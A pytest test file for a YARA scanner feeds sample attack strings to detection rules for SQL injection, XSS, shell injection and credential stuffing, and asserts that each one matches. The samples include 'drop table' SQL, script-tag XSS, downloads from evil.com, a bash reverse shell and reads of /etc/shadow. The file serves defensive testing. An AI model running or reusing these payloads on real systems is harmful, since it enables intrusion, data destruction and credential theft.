"""
YARA scanner tests.

Tests both the scanner singleton and the rule files in rules/:
  rules/sqli.yar
  rules/xss.yar
  rules/shell_injection.yar
  rules/credential_stuffing.yar

All tests skip gracefully if yara-python is not installed or rules fail to load.
"""
import pytest


@pytest.fixture(scope="module")
def scanner():
    """Module-scoped YARA scanner. Skips if rules not loaded."""
    try:
        from app.utils.yara_scanner import get_yara_scanner
        # Reset singleton so it picks up YARA_RULES_DIR from conftest env
        from app.utils import yara_scanner as _ys
        _ys._scanner_instance = None
        s = get_yara_scanner()
    except ImportError:
        pytest.skip("yara-python not installed")
    if not s.rules_loaded:
        pytest.skip("YARA rules not loaded (check YARA_RULES_DIR)")
    return s


def _match_rules(scanner, payload: bytes) -> list[str]:
    """Return list of matched rule names."""
    matches = scanner.scan_payload(payload)
    return [m.rule for m in matches] if matches else []


# ---------------------------------------------------------------------------
# SQLi rules
# ---------------------------------------------------------------------------

class TestSQLiRules:
    def test_union_select(self, scanner):
        rules = _match_rules(scanner, b"1 union select username,password from users")
        assert any("SQLi" in r or "sqli" in r.lower() for r in rules), \
            f"Expected SQLi_Union_Select, got: {rules}"

    def test_union_select_encoded(self, scanner):
        rules = _match_rules(scanner, b"1 union%20select username from users")
        assert any("SQLi" in r or "sqli" in r.lower() for r in rules)

    def test_stacked_drop(self, scanner):
        rules = _match_rules(scanner, b"1; drop table users")
        assert any("SQLi" in r or "sqli" in r.lower() for r in rules)

    def test_stacked_delete(self, scanner):
        rules = _match_rules(scanner, b"1; delete from sessions")
        assert any("SQLi" in r or "sqli" in r.lower() for r in rules)

    def test_boolean_blind(self, scanner):
        rules = _match_rules(scanner, b"1' or '1'='1")
        assert any("SQLi" in r or "sqli" in r.lower() for r in rules)

    def test_time_based_sleep(self, scanner):
        rules = _match_rules(scanner, b"1; SELECT SLEEP(5)--")
        assert any("SQLi" in r or "sqli" in r.lower() for r in rules)

    def test_time_based_waitfor(self, scanner):
        rules = _match_rules(scanner, b"1; WAITFOR DELAY '0:0:5'")
        assert any("SQLi" in r or "sqli" in r.lower() for r in rules)

    def test_information_schema(self, scanner):
        rules = _match_rules(scanner, b"SELECT table_name FROM information_schema.tables")
        assert any("SQLi" in r or "sqli" in r.lower() for r in rules)

    def test_error_based_extractvalue(self, scanner):
        rules = _match_rules(scanner, b"AND extractvalue(1,concat(0x7e,database()))")
        assert any("SQLi" in r or "sqli" in r.lower() for r in rules)

    def test_clean_sql_not_flagged(self, scanner):
        # Normal SQL-like text in a comment or description should not match
        rules = _match_rules(scanner, b"The user selected an option from the menu.")
        sqli_matches = [r for r in rules if "SQLi" in r or "sqli" in r.lower()]
        assert not sqli_matches, f"False positive: {sqli_matches}"


# ---------------------------------------------------------------------------
# XSS rules
# ---------------------------------------------------------------------------

class TestXSSRules:
    def test_script_tag(self, scanner):
        rules = _match_rules(scanner, b"<script>alert(1)</script>")
        assert any("XSS" in r or "xss" in r.lower() for r in rules)

    def test_script_tag_encoded(self, scanner):
        rules = _match_rules(scanner, b"%3cscript%3ealert(1)%3c/script%3e")
        assert any("XSS" in r or "xss" in r.lower() for r in rules)

    def test_onerror_event(self, scanner):
        rules = _match_rules(scanner, b'<img src=x onerror=alert(1)>')
        assert any("XSS" in r or "xss" in r.lower() for r in rules)

    def test_onload_event(self, scanner):
        rules = _match_rules(scanner, b'<body onload=alert(1)>')
        assert any("XSS" in r or "xss" in r.lower() for r in rules)

    def test_javascript_protocol(self, scanner):
        rules = _match_rules(scanner, b'<a href="javascript:alert(1)">click</a>')
        assert any("XSS" in r or "xss" in r.lower() for r in rules)

    def test_vbscript_protocol(self, scanner):
        rules = _match_rules(scanner, b'<a href="vbscript:msgbox(1)">click</a>')
        assert any("XSS" in r or "xss" in r.lower() for r in rules)

    def test_data_uri(self, scanner):
        rules = _match_rules(scanner, b'<iframe src="data:text/html,<script>alert(1)</script>">')
        assert any("XSS" in r or "xss" in r.lower() for r in rules)

    def test_polyglot(self, scanner):
        rules = _match_rules(scanner, b"alert(document.cookie)")
        assert any("XSS" in r or "xss" in r.lower() for r in rules)


# ---------------------------------------------------------------------------
# Shell injection rules
# ---------------------------------------------------------------------------

class TestShellInjectionRules:
    def test_pipe_to_cat(self, scanner):
        rules = _match_rules(scanner, b"filename.txt | cat /etc/passwd")
        assert any("Shell" in r or "shell" in r.lower() for r in rules)

    def test_semicolon_ls(self, scanner):
        rules = _match_rules(scanner, b"test; ls -la")
        assert any("Shell" in r or "shell" in r.lower() for r in rules)

    def test_subshell(self, scanner):
        rules = _match_rules(scanner, b"$(whoami)")
        assert any("Shell" in r or "shell" in r.lower() for r in rules)

    def test_backtick(self, scanner):
        rules = _match_rules(scanner, b"`id`")
        assert any("Shell" in r or "shell" in r.lower() for r in rules)

    def test_passwd_file(self, scanner):
        rules = _match_rules(scanner, b"cat /etc/passwd")
        assert any("Shell" in r or "shell" in r.lower() for r in rules)

    def test_shadow_file(self, scanner):
        rules = _match_rules(scanner, b"cat /etc/shadow")
        assert any("Shell" in r or "shell" in r.lower() for r in rules)

    def test_curl_download(self, scanner):
        rules = _match_rules(scanner, b"curl -O http://evil.com/payload.sh")
        assert any("Shell" in r or "shell" in r.lower() for r in rules)

    def test_wget_download(self, scanner):
        rules = _match_rules(scanner, b"wget http://evil.com/backdoor")
        assert any("Shell" in r or "shell" in r.lower() for r in rules)

    def test_reverse_shell_bash(self, scanner):
        rules = _match_rules(scanner, b"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
        assert any("Shell" in r or "shell" in r.lower() for r in rules)

    def test_reverse_shell_python(self, scanner):
        rules = _match_rules(scanner, b"python -c 'import socket,os,pty'")
        assert any("Shell" in r or "shell" in r.lower() for r in rules)


# ---------------------------------------------------------------------------
# Credential stuffing rules
# ---------------------------------------------------------------------------

class TestCredentialStuffingRules:
    def test_tool_signature_openbullet(self, scanner):
        rules = _match_rules(scanner, b'{"tool": "openbullet", "config_version": "2"}')
        assert any("Cred" in r or "cred" in r.lower() for r in rules)

    def test_tool_signature_blackbullet(self, scanner):
        rules = _match_rules(scanner, b"blackbullet combo list loaded")
        assert any("Cred" in r or "cred" in r.lower() for r in rules)

    def test_common_passwords_bulk(self, scanner):
        # 3+ common passwords in one payload → bulk test signal
        rules = _match_rules(
            scanner,
            b"password123 qwerty123 letmein admin123 welcome1 iloveyou"
        )
        assert any("Cred" in r or "cred" in r.lower() for r in rules)
